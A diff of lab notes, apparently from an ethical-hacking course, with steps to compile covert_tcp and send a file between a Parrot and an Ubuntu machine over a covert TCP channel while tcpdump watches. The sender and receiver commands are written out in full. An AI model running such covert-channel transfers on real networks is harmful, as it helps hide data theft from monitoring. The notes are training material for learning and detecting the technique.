@@ -1,4 +1,4 @@
-Parrot OS -> mkdir send on Desktop -> create file echo "secret message" > message.txt
+Parrot OS -> cd Desktop -> mkdir send on Desktop -> create file echo "secret message" > message.txt
 Copy from windows machine covert_tcp.c to send directory: places -> Network -> smb://10.10.1.11
 compile covert_tcp
 cc -o covert_tcp covert_tcp.c
@@ -8,8 +8,13 @@ Ubuntu machine -> sudo machine
 listen to tcp dump 
 tcpdump -nvvx port 8888 -i lo
 
-ubuntu machine
-create folder receive
+ubuntu machine -> cd Desktop -> mkdir Receive -> cd Receive
+Click on Files -> Other Locations
+smb://10.10.1.11 -> copy covert_tcp to Receive folder
+Compile covert_tcp
+cc -o covert_tcp covert_tcp.c
+
+on Ubuntu - continue to sudo su
    ./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 9999 -dest_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt
   parrot
   ./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 8888 -dest_port 9999 -file /home/attacker/Desktop/Send/message.txt
